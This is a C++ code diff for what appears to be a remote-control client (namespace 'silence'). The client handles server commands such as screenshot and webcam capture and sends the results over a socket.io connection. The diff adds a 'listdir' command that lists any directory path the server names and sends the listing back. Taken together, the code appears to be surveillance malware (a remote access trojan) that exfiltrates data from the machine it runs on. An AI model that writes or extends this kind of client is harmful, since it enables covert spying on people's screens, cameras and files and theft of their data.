@@ -88,6 +88,9 @@ namespace silence
             launchEvent<void()>(std::bind(&Client::screenshotEvent, this));
         else if (event == "webcamshot")
             launchEvent<void()>(std::bind(&Client::webcamShotEvent, this));
+        else if (event == "listdir")
+            launchEvent<void(const CommandObject &)>(
+                std::bind(&Client::listDirEvent, this, _1), commandObject);
         else
             error(event, "Unknown event");
     }
@@ -156,6 +159,15 @@ namespace silence
             mSocket->emit("frame",
                           impl::toBinaryString(image));
         }
+    }
+
+    void Client::listDirEvent(const CommandObject &object)
+    {
+        auto dirList = sio::array_message::create();
+        for (const auto &entry : fs::directory_iterator(object.at("path")->get_string()))
+            dirList->get_vector().push_back(sio::string_message::create(entry.path()));
+
+        mSocket->emit("directory", dirList);
     }
 
     void Client::error(const std::string &event, const std::string &msg)
